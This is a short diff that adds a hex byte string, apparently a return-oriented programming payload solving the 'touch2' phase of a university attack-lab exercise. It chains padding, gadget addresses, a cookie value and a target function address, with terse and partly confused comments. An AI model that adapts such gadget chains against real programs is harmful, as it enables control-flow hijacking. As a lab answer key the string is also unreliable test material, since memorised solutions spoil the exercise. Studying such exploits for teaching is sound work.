@@ -1,0 +1,7 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+87 1a 40 00 00 00 00 00 /* getval, 476. pop %rax, ret = move %rsp, %rax;  add $8, %rsp; return */
+a8 d0 bb 35 00 00 00 00 /* cookie value, this is %rsp ,getval 241 */
+8a 1a 40 00 00 00 00 00 /* move rax to rdi, getval 241 */
+d8 18 40 00 00 00 00 00 /* touch 2 value */
